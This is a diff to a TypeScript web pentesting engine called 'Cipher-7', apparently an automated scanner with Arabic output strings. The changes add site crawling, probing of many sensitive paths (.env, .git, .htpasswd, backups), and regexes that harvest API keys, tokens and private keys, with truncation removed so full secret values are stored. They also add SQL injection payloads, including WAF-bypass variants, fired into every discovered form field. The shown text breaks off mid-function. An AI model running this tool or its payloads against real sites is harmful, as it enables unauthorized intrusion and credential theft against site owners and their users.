@@ -5935,7 +5935,7 @@ export async function runCloudPentest(sessionId: string): Promise<{
       while ((m = regex.exec(content)) !== null) {
         const value = (m[1] ?? m[0]).trim().replace(/^["'`]|["'`]$/g, "");
         if (value.length < 8) continue;
-        const key = `${stype}:${value.slice(0, 20)}`;
+        const key = `${stype}:${value}`;
         if (seenSecrets.has(key)) continue;
         seenSecrets.add(key);
         const line = content.slice(0, m.index).split("\n").length;
@@ -7028,8 +7028,45 @@ Exported Activities: ${exportedActivities}
 }
 
 // ═══════════════════════════════════════════════════════════════
-// WEB PENTEST — Cipher-7 Web Penetration Testing Engine (14 Phases)
+// WEB PENTEST — Cipher-7 Web Penetration Testing Engine v11.0
+// Deep Crawler + Form Testing + Advanced Vuln Scanning
 // ═══════════════════════════════════════════════════════════════
+
+interface DiscoveredForm {
+  action: string;
+  method: string;
+  inputs: Array<{ name: string; type: string; value: string }>;
+  page: string;
+}
+
+interface CrawledPage {
+  url: string;
+  status: number;
+  title: string;
+  forms: DiscoveredForm[];
+  links: string[];
+  inputs: number;
+  html: string;
+}
+
+interface CookieInfo {
+  name: string;
+  value: string;
+  domain: string;
+  path: string;
+  httpOnly: boolean;
+  secure: boolean;
+  sameSite: string;
+  expires: string;
+  issues: string[];
+}
+
+interface DomXssSink {
+  sink: string;
+  file: string;
+  context: string;
+  severity: "critical" | "high" | "medium";
+}
 
 interface WebFetchResult {
   url: string;
@@ -7039,6 +7076,11 @@ interface WebFetchResult {
   status: number;
   redirectChain: string[];
   technologies: string[];
+  cookies: CookieInfo[];
+  crawledPages: CrawledPage[];
+  allForms: DiscoveredForm[];
+  domXssSinks: DomXssSink[];
+  wafDetected: string | null;
 }
 
 async function fetchWebTarget(targetUrl: string): Promise<WebFetchResult> {
@@ -7123,7 +7165,250 @@ async function fetchWebTarget(targetUrl: string): Promise<WebFetchResult> {
   });
   await Promise.all(fetchPromises);
 
-  return { url: finalUrl, html, headers, scripts, status, redirectChain, technologies };
+  // ═══ DEEP WEB CRAWLER — Discover pages, forms, inputs ═══
+  const baseDomainForCrawl = new URL(finalUrl).origin;
+  const crawledUrls = new Set<string>([finalUrl]);
+  const crawledPages: CrawledPage[] = [];
+  const allForms: DiscoveredForm[] = [];
+
+  function extractForms(pageHtml: string, pageUrl: string): DiscoveredForm[] {
+    const forms: DiscoveredForm[] = [];
+    const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/gi;
+    let fm: RegExpExecArray | null;
+    while ((fm = formRegex.exec(pageHtml)) !== null) {
+      const formTag = fm[0];
+      const actionMatch = formTag.match(/action=["']([^"']*?)["']/i);
+      const methodMatch = formTag.match(/method=["']([^"']*?)["']/i);
+      let action = actionMatch?.[1] || pageUrl;
+      if (action && !action.startsWith("http")) {
+        try { action = new URL(action, pageUrl).href; } catch { action = pageUrl; }
+      }
+      const method = (methodMatch?.[1] || "GET").toUpperCase();
+      const inputs: Array<{ name: string; type: string; value: string }> = [];
+      const inputRegex = /<(?:input|textarea|select)[^>]*>/gi;
+      let im: RegExpExecArray | null;
+      while ((im = inputRegex.exec(fm[1])) !== null) {
+        const tag = im[0];
+        const nameM = tag.match(/name=["']([^"']*?)["']/i);
+        const typeM = tag.match(/type=["']([^"']*?)["']/i);
+        const valM = tag.match(/value=["']([^"']*?)["']/i);
+        if (nameM?.[1]) {
+          inputs.push({ name: nameM[1], type: typeM?.[1] || "text", value: valM?.[1] || "" });
+        }
+      }
+      if (inputs.length > 0) {
+        forms.push({ action, method, inputs, page: pageUrl });
+      }
+    }
+    return forms;
+  }
+
+  function extractLinks(pageHtml: string, pageUrl: string): string[] {
+    const links: string[] = [];
+    const linkRegex = /href=["']([^"'#]*?)["']/gi;
+    let lm: RegExpExecArray | null;
+    while ((lm = linkRegex.exec(pageHtml)) !== null) {
+      let href = lm[1].trim();
+      if (!href || href.startsWith("javascript:") || href.startsWith("mailto:") || href.startsWith("tel:") || href === "/" || href === "#") continue;
+      try {
+        const resolved = new URL(href, pageUrl).href;
+        if (resolved.startsWith(baseDomainForCrawl) && !crawledUrls.has(resolved)) {
+          links.push(resolved);
+        }
+      } catch {}
+    }
+    return [...new Set(links)];
+  }
+
+  // Parse main page forms
+  const mainPageForms = extractForms(html, finalUrl);
+  allForms.push(...mainPageForms);
+  const mainPageLinks = extractLinks(html, finalUrl);
+  const titleMatch = html.match(/<title[^>]*>([^<]*)<\/title>/i);
+  crawledPages.push({
+    url: finalUrl,
+    status,
+    title: titleMatch?.[1]?.trim() || "",
+    forms: mainPageForms,
+    links: mainPageLinks,
+    inputs: mainPageForms.reduce((sum, f) => sum + f.inputs.length, 0),
+    html,
+  });
+
+  // Crawl discovered links (up to 25 pages)
+  const linksToCrawl = mainPageLinks.slice(0, 25);
+  const crawlPromises = linksToCrawl.map(async (link) => {
+    if (crawledUrls.has(link)) return;
+    crawledUrls.add(link);
+    try {
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 10_000);
+      const r = await fetch(link, {
+        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" },
+        signal: ctrl.signal, redirect: "follow",
+      });
+      clearTimeout(t);
+      if (!r.ok) return;
+      const contentType = r.headers.get("content-type") || "";
+      if (!contentType.includes("html")) return;
+      const pageHtml = await r.text();
+      const pageForms = extractForms(pageHtml, link);
+      allForms.push(...pageForms);
+      const pageLinks = extractLinks(pageHtml, link);
+      const pageTitleMatch = pageHtml.match(/<title[^>]*>([^<]*)<\/title>/i);
+      crawledPages.push({
+        url: link,
+        status: r.status,
+        title: pageTitleMatch?.[1]?.trim() || "",
+        forms: pageForms,
+        links: pageLinks,
+        inputs: pageForms.reduce((sum, f) => sum + f.inputs.length, 0),
+        html: pageHtml,
+      });
+      // Second-level crawl (discover more links from crawled pages)
+      for (const subLink of pageLinks.slice(0, 10)) {
+        if (!crawledUrls.has(subLink)) {
+          crawledUrls.add(subLink);
+          linksToCrawl.push(subLink);
+        }
+      }
+    } catch {}
+  });
+  await Promise.allSettled(crawlPromises);
+
+  // ═══ COOKIE SECURITY ANALYSIS ═══
+  const cookies: CookieInfo[] = [];
+  const setCookieHeaders = headers["set-cookie"];
+  if (setCookieHeaders) {
+    const cookieStrings = setCookieHeaders.split(/,(?=[^ ])/);
+    for (const cookieStr of cookieStrings) {
+      const parts = cookieStr.split(";").map(p => p.trim());
+      const [nameVal, ...attrs] = parts;
+      const eqIdx = nameVal.indexOf("=");
+      if (eqIdx < 0) continue;
+      const name = nameVal.slice(0, eqIdx).trim();
+      const value = nameVal.slice(eqIdx + 1).trim();
+      const cookie: CookieInfo = { name, value, domain: "", path: "/", httpOnly: false, secure: false, sameSite: "None", expires: "", issues: [] };
+      for (const attr of attrs) {
+        const lower = attr.toLowerCase();
+        if (lower === "httponly") cookie.httpOnly = true;
+        else if (lower === "secure") cookie.secure = true;
+        else if (lower.startsWith("samesite=")) cookie.sameSite = attr.split("=")[1] || "None";
+        else if (lower.startsWith("domain=")) cookie.domain = attr.split("=")[1] || "";
+        else if (lower.startsWith("path=")) cookie.path = attr.split("=")[1] || "/";
+        else if (lower.startsWith("expires=")) cookie.expires = attr.split("=").slice(1).join("=") || "";
+      }
+      if (!cookie.httpOnly) cookie.issues.push("❌ لا يوجد HttpOnly — يمكن سرقة الكوكي عبر XSS باستخدام document.cookie");
+      if (!cookie.secure) cookie.issues.push("❌ لا يوجد Secure — يُرسل عبر HTTP غير مشفر");
+      if (cookie.sameSite === "None" || !cookie.sameSite) cookie.issues.push("❌ SameSite=None — عرضة لهجمات CSRF");
+      if (/session|token|auth|jwt|sid/i.test(name) && !cookie.httpOnly) cookie.issues.push("🔴 CRITICAL: كوكي مصادقة بدون HttpOnly!");
+      if (/session|token|auth|jwt|sid/i.test(name) && !cookie.secure) cookie.issues.push("🔴 CRITICAL: كوكي مصادقة بدون Secure!");
+      cookies.push(cookie);
+    }
+  }
+
+  // ═══ DOM XSS SINK DETECTION ═══
+  const domXssSinks: DomXssSink[] = [];
+  const sinkPatterns: Array<{ pattern: RegExp; sink: string; severity: "critical" | "high" | "medium" }> = [
+    { pattern: /\.innerHTML\s*=(?!=)/g, sink: "innerHTML", severity: "critical" },
+    { pattern: /\.outerHTML\s*=(?!=)/g, sink: "outerHTML", severity: "critical" },
+    { pattern: /document\.write\s*\(/g, sink: "document.write", severity: "critical" },
+    { pattern: /document\.writeln\s*\(/g, sink: "document.writeln", severity: "critical" },
+    { pattern: /eval\s*\(/g, sink: "eval()", severity: "critical" },
+    { pattern: /new\s+Function\s*\(/g, sink: "new Function()", severity: "critical" },
+    { pattern: /setTimeout\s*\(\s*['"]/g, sink: "setTimeout(string)", severity: "high" },
+    { pattern: /setInterval\s*\(\s*['"]/g, sink: "setInterval(string)", severity: "high" },
+    { pattern: /\.insertAdjacentHTML\s*\(/g, sink: "insertAdjacentHTML", severity: "high" },
+    { pattern: /location\s*=\s*(?!location)/g, sink: "location assignment", severity: "high" },
+    { pattern: /location\.href\s*=/g, sink: "location.href", severity: "high" },
+    { pattern: /location\.replace\s*\(/g, sink: "location.replace", severity: "high" },
+    { pattern: /window\.open\s*\(/g, sink: "window.open", severity: "medium" },
+    { pattern: /\.src\s*=(?!=)/g, sink: ".src assignment", severity: "medium" },
+    { pattern: /\.href\s*=(?!=)/g, sink: ".href assignment", severity: "medium" },
+    { pattern: /\$\(\s*[^)]*\)\s*\.html\s*\(/g, sink: "jQuery .html()", severity: "high" },
+    { pattern: /\$\(\s*[^)]*\)\s*\.append\s*\(/g, sink: "jQuery .append()", severity: "high" },
+    { pattern: /dangerouslySetInnerHTML/g, sink: "React dangerouslySetInnerHTML", severity: "high" },
+    { pattern: /v-html\s*=/g, sink: "Vue v-html directive", severity: "high" },
+    { pattern: /\[innerHTML\]\s*=/g, sink: "Angular [innerHTML]", severity: "high" },
+  ];
+
+  const sourcePatterns: Array<{ pattern: RegExp; source: string }> = [
+    { pattern: /location\.hash/g, source: "location.hash" },
+    { pattern: /location\.search/g, source: "location.search" },
+    { pattern: /location\.href/g, source: "location.href" },
+    { pattern: /document\.referrer/g, source: "document.referrer" },
+    { pattern: /document\.URL/g, source: "document.URL" },
+    { pattern: /window\.name/g, source: "window.name" },
+    { pattern: /document\.cookie/g, source: "document.cookie" },
+    { pattern: /localStorage\./g, source: "localStorage" },
+    { pattern: /sessionStorage\./g, source: "sessionStorage" },
+    { pattern: /\.getItem\s*\(/g, source: "getItem()" },
+    { pattern: /URLSearchParams/g, source: "URLSearchParams" },
+    { pattern: /postMessage/g, source: "postMessage" },
+  ];
+
+  for (const src of [{ name: "HTML (main page)", content: html }, ...scripts.map((s, i) => ({ name: `Script #${i + 1}`, content: s }))]) {
+    for (const { pattern, sink, severity } of sinkPatterns) {
+      pattern.lastIndex = 0;
+      let sm2: RegExpExecArray | null;
+      while ((sm2 = pattern.exec(src.content)) !== null) {
+        const start = Math.max(0, sm2.index - 60);
+        const end = Math.min(src.content.length, sm2.index + sm2[0].length + 60);
+        const context = src.content.slice(start, end).replace(/\n/g, " ").trim();
+        domXssSinks.push({ sink, file: src.name, context, severity });
+        if (domXssSinks.filter(d => d.file === src.name && d.sink === sink).length >= 5) break;
+      }
+    }
+  }
+
+  // ═══ WAF DETECTION ═══
+  let wafDetected: string | null = null;
+  const serverHeader = (headers["server"] || "").toLowerCase();
+  const wafHeaders = {
+    "x-sucuri-id": "Sucuri WAF",
+    "x-sucuri-cache": "Sucuri WAF",
+    "cf-ray": "Cloudflare WAF",
+    "cf-cache-status": "Cloudflare WAF",
+    "x-cdn": "Incapsula/Imperva",
+    "x-iinfo": "Incapsula/Imperva",
+    "x-akamai-transformed": "Akamai WAF",
+    "x-protected-by": headers["x-protected-by"] || "",
+    "x-waf-event-info": "AWS WAF",
+    "x-amz-cf-id": "AWS CloudFront",
+  };
+  for (const [hdr, wafName] of Object.entries(wafHeaders)) {
+    if (headers[hdr]) { wafDetected = wafName; break; }
+  }
+  if (!wafDetected) {
+    if (serverHeader.includes("cloudflare")) wafDetected = "Cloudflare WAF";
+    else if (serverHeader.includes("sucuri")) wafDetected = "Sucuri WAF";
+    else if (serverHeader.includes("barracuda")) wafDetected = "Barracuda WAF";
+    else if (serverHeader.includes("bigip") || serverHeader.includes("f5")) wafDetected = "F5 BIG-IP WAF";
+    else if (serverHeader.includes("mod_security") || serverHeader.includes("modsecurity")) wafDetected = "ModSecurity WAF";
+    else if (serverHeader.includes("fortiweb")) wafDetected = "FortiWeb WAF";
+    else if (serverHeader.includes("akamai")) wafDetected = "Akamai WAF";
+  }
+  if (!wafDetected) {
+    try {
+      const wafTestCtrl = new AbortController();
+      const wafTimeout = setTimeout(() => wafTestCtrl.abort(), 8_000);
+      const wafResp = await fetch(`${baseDomainForCrawl}/?q=<script>alert(1)</script>`, {
+        headers: { "User-Agent": "Mozilla/5.0" }, signal: wafTestCtrl.signal, redirect: "follow",
+      });
+      clearTimeout(wafTimeout);
+      if (wafResp.status === 403 || wafResp.status === 406 || wafResp.status === 419 || wafResp.status === 429) {
+        const wafBody = await wafResp.text();
+        if (/cloudflare|cf-ray/i.test(wafBody)) wafDetected = "Cloudflare WAF";
+        else if (/sucuri|firewall/i.test(wafBody)) wafDetected = "Sucuri WAF";
+        else if (/incapsula|imperva/i.test(wafBody)) wafDetected = "Incapsula/Imperva WAF";
+        else if (/mod_security|modsecurity/i.test(wafBody)) wafDetected = "ModSecurity WAF";
+        else if (/aws|waf/i.test(wafBody)) wafDetected = "AWS WAF";
+        else wafDetected = `WAF مكتشف (HTTP ${wafResp.status})`;
+      }
+    } catch {}
+  }
+
+  return { url: finalUrl, html, headers, scripts, status, redirectChain, technologies, cookies, crawledPages, allForms, domXssSinks, wafDetected };
 }
 
 export async function runWebPentest(targetUrl: string): Promise<{
@@ -7171,6 +7456,29 @@ export async function runWebPentest(targetUrl: string): Promise<{
     ["Google Maps API Key",     /AIzaSy[A-Za-z0-9\-_]{33}/g],
     ["Mailgun API Key",         /key-[a-z0-9]{32}/g],
     ["Twilio Account SID",      /AC[a-z0-9]{32}/g],
+    ["Twilio Auth Token",       /(?:twilio[_\-]?auth[_\-]?token|TWILIO_AUTH_TOKEN)["\s:=]+([a-f0-9]{32})/gi],
+    ["Discord Webhook",         /https:\/\/(?:discord|discordapp)\.com\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_\-]+/gi],
+    ["Discord Bot Token",       /(?:discord[_\-]?(?:bot[_\-]?)?token)["\s:=\'`]+([A-Za-z0-9\-_.]{50,80})/gi],
+    ["OpenAI API Key",          /sk-[A-Za-z0-9]{20,}/g],
+    ["Anthropic API Key",       /sk-ant-[A-Za-z0-9\-_]{20,}/g],
+    ["Database URL",            /(?:postgres|mysql|mariadb|mssql):\/\/[^\s"\'<>]{10,}/gi],
+    ["Redis URL",               /redis:\/\/[^\s"\'<>]{10,}/gi],
+    ["SMTP Credentials",        /smtp:\/\/[^\s"\'<>]{10,}/gi],
+    ["Email Address",           /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g],
+    ["Internal URL",            /https?:\/\/(?:localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)[:\d\/][^\s"\'<>]*/gi],
+    ["Supabase Key",            /eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_.+/=]*/g],
+    ["Algolia API Key",         /(?:algolia[_\-]?(?:api[_\-]?)?key|ALGOLIA_API_KEY)["\s:=\'`]+([a-f0-9]{32})/gi],
+    ["Mapbox Token",            /pk\.[a-zA-Z0-9]{60,}/g],
+    ["Heroku API Key",          /(?:heroku[_\-]?api[_\-]?key|HEROKU_API_KEY)["\s:=\'`]+([a-f0-9\-]{36})/gi],
+    ["PayPal Client ID",        /(?:paypal[_\-]?client[_\-]?id|PAYPAL_CLIENT_ID)["\s:=\'`]+([A-Za-z0-9\-_]{20,80})/gi],
+    ["Square Access Token",     /sq0[a-z]{3}-[A-Za-z0-9\-_]{22,}/g],
+    ["Shopify Token",           /shpat_[a-fA-F0-9]{32}/g],
+    ["NPM Token",               /npm_[A-Za-z0-9]{36}/g],
+    ["Docker Auth",             /(?:docker[_\-]?(?:auth|password|token))["\s:=\'`]+([^\s"\'`<>]{8,})/gi],
+    ["SSH Private Key",         /-----BEGIN (?:DSA|ECDSA|ED25519) PRIVATE KEY-----/g],
+    ["PGP Private Key",         /-----BEGIN PGP PRIVATE KEY BLOCK-----/g],
+    ["Secret in Comment",       /(?:\/\/|\/\*|#)\s*(?:secret|password|token|key|api.?key)\s*[:=]\s*([^\s*\/]{6,})/gi],
+    ["Hardcoded Credential",    /(?:credentials?|cred|auth_token|access_token|secret_key|private_key)["\s:=\'`]+([^\s"\'`<>]{8,80})/gi],
   ];
 
   interface WebSecret { type: string; value: string; source: string; }
@@ -7180,6 +7488,7 @@ export async function runWebPentest(targetUrl: string): Promise<{
   const sources = [
     { name: "HTML (main page)", content: webData.html },
     ...webData.scripts.map((s, i) => ({ name: `Script #${i + 1}`, content: s })),
+    ...webData.crawledPages.filter(p => p.html && p.html !== webData.html).map(p => ({ name: `Page: ${p.url}`, content: p.html })),
   ];
 
   for (const src of sources) {
@@ -7189,7 +7498,7 @@ export async function runWebPentest(targetUrl: string): Promise<{
       while ((m = regex.exec(src.content)) !== null) {
         const value = (m[1] ?? m[0]).trim().replace(/^["'`]|["'`]$/g, "");
         if (value.length < 8) continue;
-        const key = `${stype}:${value.slice(0, 20)}`;
+        const key = `${stype}:${value}`;
         if (seenSecrets.has(key)) continue;
         seenSecrets.add(key);
         allSecrets.push({ type: stype, value, source: src.name });
@@ -7288,7 +7597,7 @@ export async function runWebPentest(targetUrl: string): Promise<{
         const decoded = Buffer.from(str, "base64").toString("utf-8");
         if (/[\x00-\x08\x0e-\x1f]/.test(decoded)) continue;
         if (cryptoKw.some(kw => decoded.toLowerCase().includes(kw))) {
-          webCipher7Crypto.push({ type: "base64", original: str.slice(0, 80), decoded: decoded.slice(0, 300), file: src.name });
+          webCipher7Crypto.push({ type: "base64", original: str, decoded: decoded, file: src.name });
         }
       } catch {}
     }
@@ -7320,7 +7629,7 @@ export async function runWebPentest(targetUrl: string): Promise<{
         const decoded = Buffer.from(clean, "hex").toString("utf-8");
         if (/[\x00-\x08\x0e-\x1f]/.test(decoded)) continue;
         if (cryptoKw.some(kw => decoded.toLowerCase().includes(kw))) {
-          webCipher7Crypto.push({ type: "hex", original: hex.slice(0, 80), decoded: decoded.slice(0, 200), file: src.name });
+          webCipher7Crypto.push({ type: "hex", original: hex, decoded: decoded, file: src.name });
         }
       } catch {}
     }
@@ -7344,10 +7653,38 @@ export async function runWebPentest(targetUrl: string): Promise<{
   }
 
   const sensitivePaths = [
-    "/.env", "/wp-admin", "/admin", "/login", "/api/config", "/debug",
-    "/.git/config", "/server-status", "/phpinfo.php", "/backup",
-    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
-    "/graphql", "/api/swagger", "/api/docs", "/swagger-ui.html",
+    // Environment & Config
+    "/.env", "/.env.local", "/.env.production", "/.env.backup", "/config.json", "/config.yml", "/config.php",
+    "/api/config", "/api/settings", "/api/env", "/wp-config.php", "/web.config", "/application.yml",
+    // Git & VCS
+    "/.git/config", "/.git/HEAD", "/.gitignore", "/.svn/entries", "/.hg/hgrc",
+    // Admin & Auth
+    "/admin", "/admin/login", "/administrator", "/wp-admin", "/wp-login.php", "/login", "/signin",
+    "/dashboard", "/panel", "/cpanel", "/phpmyadmin", "/adminer.php", "/manager/html",
+    // Debug & Status
+    "/debug", "/debug/vars", "/server-status", "/server-info", "/phpinfo.php", "/info.php",
+    "/_debug", "/actuator", "/actuator/health", "/actuator/env", "/actuator/beans",
+    "/trace", "/metrics", "/__debug__", "/elmah.axd",
+    // API Documentation
+    "/graphql", "/graphiql", "/api/swagger", "/api/docs", "/swagger-ui.html", "/swagger.json",
+    "/api-docs", "/openapi.json", "/redoc", "/api/v1/docs", "/api/v2/docs",
+    // Backup & Database
+    "/backup", "/backup.sql", "/backup.zip", "/database.sql", "/db.sql", "/dump.sql",
+    "/data.json", "/export.csv", "/backup.tar.gz", "/.sql",
+    // System & Logs
+    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/crossdomain.xml",
+    "/logs", "/log", "/error.log", "/access.log", "/debug.log", "/app.log",
+    // Source & Hidden
+    "/.DS_Store", "/.htaccess", "/.htpasswd", "/Thumbs.db", "/.bash_history",
+    "/composer.json", "/package.json", "/Gemfile", "/requirements.txt",
+    "/Dockerfile", "/docker-compose.yml", "/.dockerignore",
+    // WordPress Specific
+    "/xmlrpc.php", "/wp-json/wp/v2/users", "/wp-content/debug.log",
+    // Firebase & Cloud
+    "/__/firebase/init.json", "/firebase-messaging-sw.js",
+    // Misc
+    "/test", "/testing", "/staging", "/dev", "/old", "/temp", "/tmp",
+    "/cgi-bin/", "/console", "/shell", "/cmd", "/exec",
   ];
   interface PathCheckResult { path: string; status: number; accessible: boolean; size: number; }
   const pathResults: PathCheckResult[] = [];
@@ -7491,111 +7828,345 @@ if __name__ == "__main__":
     if (acao === "*" || acao === "https://evil-attacker.com") corsVulnerable = true;
   } catch {}
 
-  // ═══ DEEP VULNERABILITY SCANNING (Phase 8-10) ═══
-  interface VulnProbeResult { type: string; severity: "critical"|"high"|"medium"|"low"; url: string; payload: string; evidence: string; exploitable: boolean; }
+  // ═══════════════════════════════════════════════════════════════
+  // DEEP VULNERABILITY SCANNING v11.0 — Enhanced Engine
+  // Form-based + Advanced SQLi/XSS + SSTI + CmdI + HTTP Methods
+  // ═══════════════════════════════════════════════════════════════
+  interface VulnProbeResult { type: string; severity: "critical"|"high"|"medium"|"low"; url: string; payload: string; evidence: string; exploitable: boolean; method?: string; param?: string; }
   const vulnResults: VulnProbeResult[] = [];
 
-  // --- SQL Injection Probes ---
-  const sqliPayloads = [
-    { payload: "' OR '1'='1", indicator: /sql|syntax|mysql|postgresql|sqlite|oracle|ORA-|unterminated|query/i },
-    { payload: "1' AND '1'='1' --", indicator: /sql|syntax|mysql|postgresql|sqlite|oracle|ORA-|unterminated/i },
-    { payload: "1 UNION SELECT NULL--", indicator: /sql|syntax|UNION|column|mysql|postgresql/i },
-    { payload: "'; WAITFOR DELAY '0:0:5'--", indicator: /sql|syntax|WAITFOR/i },
-    { payload: "1' OR SLEEP(3)--", indicator: /sql|syntax|SLEEP/i },
-  ];
-  const sqliTargets = apiEndpoints.filter(u => /\?/.test(u) || /\/search|\/query|\/find|\/get|\/list|\/user|\/login|\/auth/i.test(u)).slice(0, 5);
-  const formActions = [...new Set((webData.html.match(/action=["']([^"']+)["']/gi) || []).map(a => a.replace(/action=["']/i, "").replace(/["']$/, "")))].slice(0, 3);
-  const sqliTestUrls = [...sqliTargets, ...formActions.map(f => f.startsWith("http") ? f : baseUrl + f)];
-
-  const sqliProbes = sqliTestUrls.slice(0, 5).flatMap(url => sqliPayloads.slice(0, 2).map(async ({ payload, indicator }) => {
+  // Helper: safe fetch with timeout
+  async function probeFetch(url: string, opts?: RequestInit & { timeoutMs?: number }): Promise<{ status: number; body: string; headers: Record<string, string> } | null> {
     try {
-      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?q=${encodeURIComponent(payload)}`;
       const ctrl = new AbortController();
-      const t = setTimeout(() => ctrl.abort(), 8_000);
-      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
+      const t = setTimeout(() => ctrl.abort(), opts?.timeoutMs || 8_000);
+      const r = await fetch(url, { ...opts, signal: ctrl.signal, headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", ...(opts?.headers as Record<string, string> || {}) } });
       clearTimeout(t);
       const body = await r.text();
-      if (indicator.test(body)) {
-        vulnResults.push({ type: "SQL Injection", severity: "critical", url: testUrl, payload, evidence: body.match(indicator)?.[0] || "SQL error detected", exploitable: true });
-      }
-    } catch {}
+      const headers: Record<string, string> = {};
+      r.headers.forEach((v, k) => { headers[k] = v; });
+      return { status: r.status, body, headers };
+    } catch { return null; }
+  }
+
+  // ═══ 1. ADVANCED SQL INJECTION — Error-based + Boolean-based + Union-based + Time-based ═══
+  const sqliPayloads = [
+    // Error-based
+    { payload: "' OR '1'='1", indicator: /sql|syntax|mysql|postgresql|sqlite|oracle|ORA-|unterminated|query|SQLSTATE|you have an error/i, type: "Error-based" },
+    { payload: "1' AND '1'='1' --", indicator: /sql|syntax|mysql|postgresql|sqlite|oracle|ORA-|unterminated|SQLSTATE/i, type: "Error-based" },
+    { payload: "1 UNION SELECT NULL--", indicator: /sql|syntax|UNION|column|mysql|postgresql|SQLSTATE/i, type: "Union-based" },
+    { payload: "1 UNION SELECT NULL,NULL--", indicator: /sql|syntax|UNION|column|mysql|postgresql/i, type: "Union-based" },
+    { payload: "1 UNION SELECT NULL,NULL,NULL--", indicator: /sql|syntax|UNION|column|mysql|postgresql/i, type: "Union-based" },
+    // Advanced error-based
+    { payload: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", indicator: /convert|int|nvarchar|varchar|sql|syntax/i, type: "Error-based (MSSQL)" },
+    { payload: "' AND extractvalue(1,concat(0x7e,(SELECT version())))--", indicator: /XPATH|extractvalue|sql|syntax|version/i, type: "Error-based (MySQL)" },
+    { payload: "' AND 1=cast((SELECT version()) as int)--", indicator: /cast|integer|failed|sql|postgresql/i, type: "Error-based (PostgreSQL)" },
+    // Boolean-based blind
+    { payload: "' AND 1=1--", indicator: null, type: "Boolean-based Blind" },
+    { payload: "' AND 1=2--", indicator: null, type: "Boolean-based Blind" },
+    // Stacked queries
+    { payload: "'; SELECT pg_sleep(3)--", indicator: /sql|syntax|pg_sleep/i, type: "Stacked Query" },
+    { payload: "'; WAITFOR DELAY '0:0:3'--", indicator: /sql|syntax|WAITFOR/i, type: "Stacked Query (MSSQL)" },
+    { payload: "1' OR SLEEP(3)--", indicator: /sql|syntax|SLEEP/i, type: "Time-based Blind (MySQL)" },
+    // WAF bypass SQLi
+    { payload: "1'/**/OR/**/1=1--", indicator: /sql|syntax|mysql|error/i, type: "WAF Bypass (comment)" },
+    { payload: "1' oR 1=1--", indicator: /sql|syntax|mysql|error/i, type: "WAF Bypass (case)" },
+    { payload: "1'||'1'='1", indicator: /sql|syntax|mysql|error/i, type: "WAF Bypass (concat)" },
+  ];
+
+  // Gather all testable URLs from API endpoints AND discovered forms
+  const sqliTargets = apiEndpoints.filter(u => /\?/.test(u) || /\/search|\/query|\/find|\/get|\/list|\/user|\/login|\/auth|\/api/i.test(u)).slice(0, 8);
+  const formActions = [...new Set(webData.allForms.map(f => f.action))].slice(0, 8);
+  const sqliTestUrls = [...new Set([...sqliTargets, ...formActions])];
+
+  // URL-based SQLi probes
+  const sqliProbes = sqliTestUrls.slice(0, 10).flatMap(url => sqliPayloads.filter(p => p.indicator).slice(0, 8).map(async ({ payload, indicator, type }) => {
+    const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?q=${encodeURIComponent(payload)}`;
+    const r = await probeFetch(testUrl);
+    if (r && indicator && indicator.test(r.body)) {
+      vulnResults.push({ type: `SQL Injection (${type})`, severity: "critical", url: testUrl, payload, evidence: r.body.match(indicator)?.[0] || "SQL error detected", exploitable: true });
+    }
   }));
 
-  // --- XSS (Reflected) Probes ---
+  // Form-based SQLi probes — test every discovered form field
+  interface FormTestResult { form: DiscoveredForm; field: string; vulnType: string; payload: string; evidence: string; }
+  const formSqliResults: FormTestResult[] = [];
+  const formSqliProbes = webData.allForms.slice(0, 15).flatMap(form =>
+    form.inputs.filter(inp => inp.type !== "hidden" && inp.type !== "submit" && inp.type !== "checkbox" && inp.type !== "radio" && inp.type !== "file")
+      .slice(0, 5).flatMap(input =>
+        sqliPayloads.filter(p => p.indicator).slice(0, 4).map(async ({ payload, indicator, type }) => {
+          const formData: Record<string, string> = {};
+          for (const inp of form.inputs) {
+            formData[inp.name] = inp.name === input.name ? payload : (inp.value || "test");
+          }
+          if (form.method === "GET") {
+            const qs = Object.entries(formData).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("&");
+            const testUrl = `${form.action}?${qs}`;
+            const r = await probeFetch(testUrl);
+            if (r && indicator && indicator.test(r.body)) {
+              formSqliResults.push({ form, field: input.name, vulnType: type, payload, evidence: r.body.match(indicator)?.[0] || "SQL error" });
+              vulnResults.push({ type: `SQL Injection (${type}) [Form]`, severity: "critical", url: testUrl, payload, evidence: `حقل: ${input.name} — ${r.body.match(indicator)?.[0] || "SQL error"}`, exploitable: true, param: input.name });
+            }
+          } else {
+            const r = await probeFetch(form.action, {
+              method: "POST",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: Object.entries(formData).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("&"),
+            });
+            if (r && indicator && indicator.test(r.body)) {
+              formSqliResults.push({ form, field: input.name, vulnType: type, payload, evidence: r.body.match(indicator)?.[0] || "SQL error" });
+              vulnResults.push({ type: `SQL Injection (${type}) [Form POST]`, severity: "critical", url: form.action, payload, evidence: `حقل: ${input.name} — ${r.body.match(indicator)?.[0] || "SQL error"}`, exploitable: true, method: "POST", param: input.name });
+            }
+          }
+        })
+      )
+  );
+
+  // Boolean-based Blind SQLi — compare response lengths
+  const blindSqliProbes = sqliTestUrls.slice(0, 5).map(async (url) => {
